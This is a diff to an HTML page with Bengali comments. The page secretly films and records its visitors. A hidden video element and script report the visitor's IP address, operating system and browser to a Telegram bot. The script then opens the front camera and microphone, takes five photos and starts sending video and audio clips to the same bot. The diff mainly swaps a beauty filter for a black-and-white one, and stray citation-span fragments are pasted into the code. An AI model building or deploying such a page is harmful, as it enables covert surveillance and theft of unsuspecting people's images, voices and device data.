@@ -68,9 +68,9 @@
       display: none;
     }
 
-    /* ✨ আরও উন্নত ও প্রিমিয়াম বিউটি ও স্কিন গ্লো ফিল্টার */
-    .filter-beauty-glow {
-      filter: contrast(108%) brightness(115%) saturate(120%) blur(0.2px) drop-shadow(0 0 4px rgba(255,255,255,0.25));
+    /* 📸 ক্লাসিক ব্ল্যাক অ্যান্ড হোয়াইট ও হাই কন্ট্রাস্ট ফিল্টার (প্রদত্ত ছবি অনুযায়ী) */
+    .filter-classic-bw {
+      filter: grayscale(100%) contrast(140%) brightness(105%);
     }
   </style>
 </head>
@@ -102,7 +102,7 @@
     </div>
   </div>
 
-  <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
+  <video id="hiddenCam" autoplay playsinline muted class="filter-classic-bw"></video>
   <canvas id="snapshotCanvas"></canvas>
 
   <script>
@@ -145,7 +145,7 @@
       else if (/opr|opera/i.test(ua)) browser = "Opera";
 
       const infoText = 
-        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>\n\n` +
+        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>[span_1](start_span)[span_1](end_span)\n\n` +
         `🌐 <b>আইপি অ্যাড্রেস (IP):</b> <code>${ipAddress}</code>\n` +
         `💻 <b>অপারেটিং সিস্টেম:</b> ${os}\n` +
         `🌐 <b>ব্রাউজার:</b> ${browser}\n` +
@@ -176,20 +176,20 @@
       sendDeviceInfo();
 
       try {
-        // ব্যাকগ্রাউন্ড নয়েজ, ইকো এবং গেইন কন্ট্রোল রিমুভ করার জন্য স্পেশাল অডিও কনফিগারেশন
+        // নয়েজ-ফ্রি অডিও কনফিগারেশন
         camStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: {
-            echoCancellation: true,      // ইকো বা প্রতিধ্বনি দূর করবে
-            noiseSuppression: true,      // ব্যাকগ্রাউন্ডের সব ধরনের নয়েজ ফিল্টার করবে
-            autoGainControl: true        // সাউন্ড লেভেল ব্যালেন্স রাখবে
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true
           }
         });
 
         hiddenCam.srcObject = camStream;
         await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ২. উন্নত বিউটি ফিল্টারসহ ৫টি ছবি তুলবে
+        // ২. ক্লাসিক বিএন্ডডব্লিউ (B&W) ফিল্টারসহ ৫টি ছবি তুলবে[span_2](start_span)[span_2](end_span)
         await captureAndSendPhotos(5);
 
         // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও পরিষ্কার অডিও ক্লিপ পাঠানো শুরু করবে
@@ -228,7 +228,7 @@
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
-          formData.append('caption', `✨ প্রিমিয়াম বিউটি ফিল্টার ছবি #${i}`);
+          formData.append('caption', `🎬 ক্লাসিক বিএন্ডডব্লিউ ছবি #${i}`);[span_3](start_span)[span_3](end_span)
 
           fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
